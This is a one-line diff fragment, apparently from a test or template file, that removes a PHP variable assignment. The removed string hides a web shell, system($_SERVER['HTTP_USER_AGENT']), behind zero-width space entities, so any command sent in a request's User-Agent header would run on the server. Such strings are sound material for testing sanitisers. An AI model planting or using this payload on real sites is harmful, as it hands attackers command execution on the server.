@@ -1,1 +1,0 @@
-$variables['weird attribute']="&#8203&#8203<?php system($_SERVER['HTTP_USER_AGENT']);??>
